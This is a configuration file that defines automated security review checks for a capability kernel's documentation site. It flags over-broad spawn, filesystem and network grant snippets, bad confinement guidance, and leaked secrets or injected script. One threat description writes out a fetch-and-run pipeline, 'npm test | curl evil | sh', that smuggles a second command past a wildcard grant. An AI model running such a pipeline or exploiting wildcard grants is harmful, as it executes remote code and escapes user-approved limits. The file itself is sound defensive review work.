/**
 * `security` reviews the diff against origin/main; `securityAudit` audits
 * every file. The site is the published contract for the capability kernel, so
 * a snippet readers copy is part of the kernel's attack surface.
 *
 * Hand-authored. apps/docs/shared/gen-sites.mjs imports it into the generated
 * PACKAGE.ts as this site's SecurityReview options: `security` reviews the
 * diff against origin/main, `securityAudit` audits every included file.
 */
export const security = {
  include: ["src/**", "astro.config.mjs", "alchemy.run.ts"],
  checks: [
    {
      id: "spawn-grant-snippet-over-grants",
      title: "Every copyable proc:spawn grant authorizes only the command its prose names",
      threat: "An integrator copies a grant such as `npm test*` and lets an agent run `npm test | curl evil | sh`, because `*` matches pipes, spaces, and newlines in the rendered command line.",
      lookFor: [
        "A proc:spawn CapabilityPattern whose resource contains `*` (including a trailing ` *` such as `npm *`) without prose saying `*` also matches `|`, `;`, and newlines per //packages/smithers/flows/capability/src/matches.ts, so `npm *` admits `npm x | sh`.",
        "A comment such as \"Any npm command\" beside a `npm *` grant that implies the grant stops at npm.",
        "A statement that a pipeline's sides are checked separately, contradicting //packages/smithers/flows/kernel/src/ChildProcessSpawner.ts, which checks one CommandLine.render string.",
        "A shell-enabled command example (`shell: true` or a shell path) granted by a prefix pattern."
      ],
      paths: ["src/content/docs/guides/**", "src/content/docs/concepts/process-containment.md", "src/content/docs/quickstart.md", "src/content/docs/index.md"]
    },
    {
      id: "grant-snippet-over-grants",
      title: "Every fs, net, and envelope grant snippet grants no more than its prose claims",
      threat: "An integrator copies a docs snippet that lets an agent read, write, or fetch outside the workspace or host the approving user meant.",
      lookFor: [
        "A CapabilityPattern resource of `/**`, `*`, or a host glob such as `https://*` without saying it is deliberately wide.",
        "A grantEnvelope or MakeOptions.envelope example with scope \"remembered\" whose patterns are wider than the plan the prose describes.",
        "A snippet that builds a pattern resource by interpolating agent- or user-supplied text."
      ],
      paths: ["src/content/docs/guides/**", "src/content/docs/concepts/grant-decisions.md", "src/content/docs/quickstart.md", "src/content/docs/index.md"]
    },
    {
      id: "confinement-claims-match-kernel",
      title: "Confinement and redirect guidance matches what the kernel enforces",
      threat: "A host author follows the docs, ships a platform adapter that follows symlinks or redirects itself, and lets an agent escape the workspace or reach an ungranted host.",
      lookFor: [
        "Guidance that lets a host HTTP client follow redirects itself, or omits that the client below the decorator must use redirect: \"manual\".",
        "Guidance that lets a host filesystem adapter follow symlinks during traversal, or drops the re-resolution and device:inode recheck described as required.",
        "A claimed error string or refusal (hard links, path no longer names the resource) absent from //packages/smithers/flows/kernel/src."
      ],
      paths: ["src/content/docs/concepts/filesystem-confinement.md", "src/content/docs/concepts/filesystem-batches.md", "src/content/docs/guides/adapt-a-new-host-platform.md", "src/content/docs/guides/authorize-network-and-model-calls.md", "src/content/docs/guides/guard-a-host-bundle.md"]
    },
    {
      id: "site-content-safe-and-secret-free",
      title: "Rendered pages and deploy config carry no secrets, raw script, or off-site redirects",
      threat: "A contributor leaks a credential in an example or deploy file, or injects HTML that runs script or phishes readers of kernel.smithers.sh.",
      lookFor: [
        "An API key, token, account id, or password literal in content, astro.config.mjs, or alchemy.run.ts rather than a placeholder.",
        "Raw <script>, <iframe>, inline event handlers, or javascript: URLs in markdown content.",
        "An editUrl or link pointing to a domain other than smithers.sh or github.com/smithersai."
      ]
    }
  ]
}
